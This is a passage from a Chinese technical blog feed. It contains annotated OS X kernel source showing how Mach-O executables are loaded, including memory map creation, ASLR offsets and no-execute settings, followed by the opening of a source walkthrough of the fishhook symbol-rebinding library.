create_map */</span></span><br><span class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>;</span><br><span class="line">	<span class="keyword">vm_map_t</span>		old_map;</span><br><span class="line">	<span class="keyword">task_t</span>			old_task = TASK_NULL; <span class="comment">/* protected by create_map */</span></span><br><span class="line">	<span class="keyword">load_result_t</span>		myresult;</span><br><span class="line">	<span class="keyword">load_return_t</span>		lret;</span><br><span class="line">	<span class="keyword">boolean_t</span> create_map = FALSE;</span><br><span class="line">	<span class="keyword">boolean_t</span> enforce_hard_pagezero = TRUE;</span><br><span class="line">	<span class="keyword">int</span> spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span class="line">	<span class="keyword">task_t</span> task = current_task();</span><br><span class="line">	<span class="keyword">proc_t</span> p = current_proc();</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	dyld_aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">kern_return_t</span> 		kret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (macho_size &gt; file_size) &#123;</span><br><span class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (new_map == VM_MAP_NULL) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = current_task();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * If we are spawning, we have created backing objects for the process</span><br><span class="line">	 * already, which include non-lazily creating the task map.  So we</span><br><span class="line">	 * are going to switch out the task map with one appropriate for the</span><br><span class="line">	 * bitness of the image being loaded.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (spawn) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = get_threadtask(thread);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//如果有new_map就用参数传进来的new_map</span></span><br><span class="line">  	<span class="comment">//否则就通过pmap_create,vm_map_create函数创建新的内存空间</span></span><br><span class="line">	<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="keyword">task_t</span> ledger_task;</span><br><span class="line">		<span class="keyword">if</span> (imgp-&gt;ip_new_thread) &#123;</span><br><span class="line">			ledger_task = get_threadtask(imgp-&gt;ip_new_thread);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ledger_task = task;</span><br><span class="line">		&#125;</span><br><span class="line">		pmap = pmap_create(get_task_ledger(ledger_task),</span><br><span class="line">				   (<span class="keyword">vm_map_size_t</span>) <span class="number">0</span>,</span><br><span class="line">				   ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) != <span class="number">0</span>));</span><br><span class="line">		pal_switch_pmap(thread, pmap, imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT);</span><br><span class="line">		<span class="built_in">map</span> = vm_map_create(pmap,</span><br><span class="line">				<span class="number">0</span>,</span><br><span class="line">				vm_compute_max_offset(((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == IMGPF_IS_64BIT)),</span><br><span class="line">				TRUE);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">map</span> = new_map;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span>   (__ARM_ARCH_7K__ &gt;= <span class="number">2</span>) &amp;&amp; defined(PLATFORM_WatchOS)</span></span><br><span class="line">	<span class="comment">/* enforce 16KB alignment for watch targets with new ABI */</span></span><br><span class="line">	vm_map_set_page_shift(<span class="built_in">map</span>, SIXTEENK_PAGE_SHIFT);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">/* __arm64__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span>	CONFIG_ENFORCE_SIGNED_CODE</span></span><br><span class="line">	<span class="comment">/* This turns off faulting for executable pages, which allows</span><br><span class="line">	 * to circumvent Code Signing Enforcement. The per process</span><br><span class="line">	 * flag (CS_ENFORCEMENT) is not set yet, but we can use the</span><br><span class="line">	 * global flag.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ( !cs_enforcement(<span class="literal">NULL</span>) &amp;&amp; (header-&gt;flags &amp; MH_ALLOW_STACK_EXECUTION) )</span><br><span class="line">	        vm_map_disable_NX(<span class="built_in">map</span>);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Forcibly disallow execution from data pages on even if the arch</span><br><span class="line">	 * normally permits it. */</span></span><br><span class="line">  	<span class="comment">//将内存设置为不可执行，用来防止溢出漏洞的利用</span></span><br><span class="line">	<span class="keyword">if</span> ((header-&gt;flags &amp; MH_NO_HEAP_EXECUTION) &amp;&amp; !(imgp-&gt;ip_flags &amp; IMGPF_ALLOW_DATA_EXEC))</span><br><span class="line">		vm_map_disallow_data_exec(<span class="built_in">map</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Compute a random offset for ASLR, and an independent random offset for dyld.</span><br><span class="line">	 */</span></span><br><span class="line">  	<span class="comment">//地址随机，计算ASLR的偏移量</span></span><br><span class="line">	<span class="keyword">if</span> (!(imgp-&gt;ip_flags &amp; IMGPF_DISABLE_ASLR)) &#123;</span><br><span class="line">		<span class="keyword">uint64_t</span> max_slide_pages;</span><br><span class="line"></span><br><span class="line">		max_slide_pages = vm_map_get_max_aslr_slide_pages(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		aslr_offset = random();</span><br><span class="line">		aslr_offset %= max_slide_pages;</span><br><span class="line">		aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		dyld_aslr_offset = random();</span><br><span class="line">		dyld_aslr_offset %= max_slide_pages;</span><br><span class="line">		dyld_aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!result)</span><br><span class="line">		result = &amp;myresult;</span><br><span class="line"></span><br><span class="line">	*result = load_result_null;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//解析macho的文件格式</span></span><br><span class="line">	lret = parse_machfile(vp, <span class="built_in">map</span>, thread, header, file_offset, macho_size,</span><br><span class="line">	                      <span class="number">0</span>, (<span class="keyword">int64_t</span>)aslr_offset, (<span class="keyword">int64_t</span>)dyld_aslr_offset, result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">			vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(lret);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * On x86, for compatibility, don't enforce the hard page-zero restriction for 32-bit binaries.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		enforce_hard_pagezero = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Check to see if the page zero is enforced by the map-&gt;min_offset.</span><br><span class="line">	 */</span> </span><br><span class="line">	<span class="keyword">if</span> (enforce_hard_pagezero &amp;&amp;</span><br><span class="line">	    (vm_map_has_hard_pagezero(<span class="built_in">map</span>, <span class="number">0x1000</span>) == FALSE)) &#123;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> (LOAD_BADMACHO);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	Commit to new map.</span><br><span class="line">	 *</span><br><span class="line">	 *	Swap the new map for the old, which  consumes our new map</span><br><span class="line">	 *	reference but each leaves us responsible for the old_map reference.</span><br><span class="line">	 *	That lets us get off the pmap associated with it, and</span><br><span class="line">	 *	then we can release it.</span><br><span class="line">	 */</span></span><br><span class="line">	 <span class="comment">//用新申请的内存替换原来的内存</span></span><br><span class="line">	 <span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * If this is an exec, then we are going to destroy the old</span><br><span class="line">		 * task, and it's correct to halt it; if it's spawn, the</span><br><span class="line">		 * task is not yet running, and it makes no sense.</span><br><span class="line">		 */</span></span><br><span class="line">	 	<span class="keyword">if</span> (!spawn) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Mark the task as halting and start the other</span><br><span class="line">			 * threads towards terminating themselves.  Then</span><br><span class="line">			 * make sure any threads waiting for a process</span><br><span class="line">			 * transition get informed that we are committed to</span><br><span class="line">			 * this transition, and then finally complete the</span><br><span class="line">			 * task halting (wait for threads and then cleanup</span><br><span class="line">			 * task resources).</span><br><span class="line">			 *</span><br><span class="line">			 * <span class="doctag">NOTE:</span> task_start_halt() makes sure that no new</span><br><span class="line">			 * threads are created in the task during the transition.</span><br><span class="line">			 * We need to mark the workqueue as exiting before we</span><br><span class="line">			 * wait for threads to terminate (at the end of which</span><br><span class="line">			 * we no longer have a prohibition on thread creation).</span><br><span class="line">			 * </span><br><span class="line">			 * Finally, clean up any lingering workqueue data structures</span><br><span class="line">			 * that may have been left behind by the workqueue threads</span><br><span class="line">			 * as they exited (and then clean up the work queue itself).</span><br><span class="line">			 */</span></span><br><span class="line">			kret = task_start_halt(task);</span><br><span class="line">			<span class="keyword">if</span> (kret != KERN_SUCCESS) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">				<span class="keyword">return</span> (LOAD_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line">			proc_transcommit(p, <span class="number">0</span>);</span><br><span class="line">			workqueue_mark_exiting(p);</span><br><span class="line">			task_complete_halt(task);</span><br><span class="line">			workqueue_exit(p);</span><br><span class="line">			kqueue_dealloc(p-&gt;p_wqkqueue);</span><br><span class="line">			p-&gt;p_wqkqueue = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		old_map = swap_task_map(old_task, thread, <span class="built_in">map</span>, !spawn);</span><br><span class="line">		vm_map_deallocate(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(LOAD_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数主要做了<code>macho</code>文件解析之外其他所有和加载相关的工作。</p>
<ul>
<li>对新的task做了内存的分配</li>
<li>加强安全方面的设置主要是<code>DEP</code>和<code>ASRL</code></li>
<li>调用函数解析macho文件</li>
<li>解析成功之后，用新申请的内存替换旧的内存。</li>
</ul>
<h2 id="1-5_parse_machfile">1.5 parse_machfile</h2><p>这个函数做的事情就非常的简单清楚了，就是将<code>macho</code>文件解析，并且映射到内存中。</p>
<p>在我的<a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/#0x03_Load_Commands">macho文件格式分析</a>中已经分析过这一块代码了。这里就不复述了。</p>
<h1 id="0x02_小结">0x02 小结</h1><p>通过对整个流程源码的一次简单梳理，大致明白了整个流程在源码中是怎么样实现的，在研究这方面的漏洞的时候可以更快的明白问题出在哪里，也可能更深刻的理解漏洞的成因以及重现的方法。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    研究<code>OS X</code>安全方面的知识需要对<code>mach-o</code>加载的流程需要有一个比较完整的理解，断断续续一个月的时间里面，通过对源码的阅读对<code>mach-o</code>的加载有一个比较基本的认识，在遇到各个具体的问题是才能更好的理解和操作。</p>
<p>​    其他相关文章可以看这里，基本涵盖了从内核态到应用层的相关源码的简单分析。还有不足之处在遇到相关的问题时也会加到这一系列文章中。</p>
<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-o加载流程学习-dyld对主image的处理流程</a></p>
<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
<p>​    3.mach-o加载流程学习-内核对mach-o文件的加载流程(本文)</p>
<p>​    </p>
<p>​    通过一张图片，可以比较清楚的理解整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p>]]>
    
    </summary>
    
      <category term="OSX" scheme="http://turingh.github.io/tags/OSX/"/>
    
      <category term="execve" scheme="http://turingh.github.io/tags/execve/"/>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[fishhook源码分析]]></title>
    <link href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/22/fishhook源码分析/</id>
    <published>2016-03-22T15:14:53.000Z</published>
    <updated>2016-03-24T03:35:54.000Z</updated>
    <content type="html"><![CDATA[<p>没什么特别要说的，详细看代码，可以结合之前的两篇文章，更好的理解这部分内容。</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o格式分析</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">mach-o延时绑定</a><br><a id="more"></a></p>
<h1 id="源码">源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright (c) 2013, Facebook, Inc.</span></span><br><span class="line"><span class="comment">// All rights reserved.</span></span><br><span class="line"><span class="comment">// Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">// modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment">//   * Redistributions of source code must retain the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment">//   * Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment">//     and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment">//   * Neither the name Facebook nor the names of its contributors may be used to</span></span><br><span class="line"><span class="comment">//     endorse or promote products derived from this software without specific</span></span><br><span class="line"><span class="comment">//     prior written permission.</span></span><br><span class="line"><span class="comment">// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</span></span><br><span class="line"><span class="comment">// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment">// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span></span><br><span class="line"><span class="comment">// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span></span><br><span class="line"><span class="comment">// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line"><span class="comment">// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span></span><br><span class="line"><span class="comment">// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span></span><br><span class="line"><span class="comment">// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span></span><br><span class="line"><span class="comment">// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import <span class="string">"fishhook.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import &lt;dlfcn.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/dyld.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/loader.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/nlist.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> __LP64__</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header_64 <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command_64 <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section_64 <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist_64 <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT_64</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span> SEG_DATA_CONST</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SEG_DATA_CONST  <span class="string">"__DATA_CONST"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> rebindings_entry &#123;</span><br><span class="line">  <span class="keyword">struct</span> rebinding *rebindings;</span><br><span class="line">  <span class="keyword">size_t</span> rebindings_nel;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">struct</span> rebindings_entry *_rebindings_head;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepend_rebindings</span><span class="params">(<span class="keyword">struct</span> rebindings_entry **rebindings_head,</span><br><span class="line">                              <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                              size_t nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *new_entry = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebindings_entry));</span><br><span class="line">  <span class="keyword">if</span> (!new_entry) &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  new_entry-&gt;rebindings = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  <span class="keyword">if</span> (!new_entry-&gt;rebindings) &#123;</span><br><span class="line">    <span class="built_in">free</span>(new_entry);</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(new_entry-&gt;rebindings, rebindings, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  new_entry-&gt;rebindings_nel = nel;</span><br><span class="line">  new_entry-&gt;next = *rebindings_head;</span><br><span class="line">  *rebindings_head = new_entry;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_rebinding_with_section</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                           section_t *section,</span><br><span class="line">                                           intptr_t slide,</span><br><span class="line">                                           nlist_t *symtab,</span><br><span class="line">                                           <span class="keyword">char</span> *strtab,</span><br><span class="line">                                           uint32_t *indirect_symtab)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//__la_symbol_ptr的reserved1字段标识了section描述的符号在符号表中开始的index</span></span><br><span class="line">  <span class="comment">//动态符号表中第一个需要解析的符号 开始地址</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">void</span> **indirect_symbol_bindings = (<span class="keyword">void</span> **)((<span class="keyword">uintptr_t</span>)slide + section-&gt;addr);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; section-&gt;size / <span class="keyword">sizeof</span>(<span class="keyword">void</span> *); i++) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> symtab_index = indirect_symbol_indices[i];</span><br><span class="line">    <span class="keyword">if</span> (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||</span><br><span class="line">        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//获取每一个需要动态解析的符号在符号表中的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> strtab_offset = symtab[symtab_index].n_un.n_strx;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//通过符号表中每一个导入符号的字符串表偏移量获取符号对应的字符串（符号的名字）</span></span><br><span class="line">    <span class="keyword">char</span> *symbol_name = strtab + strtab_offset;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *cur = rebindings;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur-&gt;rebindings_nel; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span 